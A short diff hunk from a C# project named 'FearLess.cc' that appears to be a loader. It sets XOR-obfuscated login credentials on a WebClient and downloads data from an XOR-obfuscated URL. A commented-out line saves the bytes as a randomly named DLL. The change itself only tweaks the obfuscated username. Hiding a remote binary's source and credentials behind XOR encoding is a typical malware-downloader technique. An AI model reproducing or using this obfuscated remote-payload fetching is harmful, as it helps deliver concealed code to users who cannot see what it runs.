@@ -206,7 +206,7 @@ namespace FearLess.cc
         {
 
             WebClient cli = new WebClient();
-            cli.Credentials = new NetworkCredential(xor("!$$%", "immaraturpclmaothatsdakey"), xor("#\n", "immaraturpclmaothatsdakey"));
+            cli.Credentials = new NetworkCredential(xor("!$$%", "immaraturpclmaothatsdakey")+"o", xor("#\n", "immaraturpclmaothatsdakey"));
             byte[] bytes = cli.DownloadData(@xor("[[Z\t\rOK\nF\x00\x00\x00\x00\x00BVR_X'*4%<:;1%-#-A\r", "immaraturpclmaothatsdakey"));
 
                 //File.WriteAllBytes(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll", bytes);
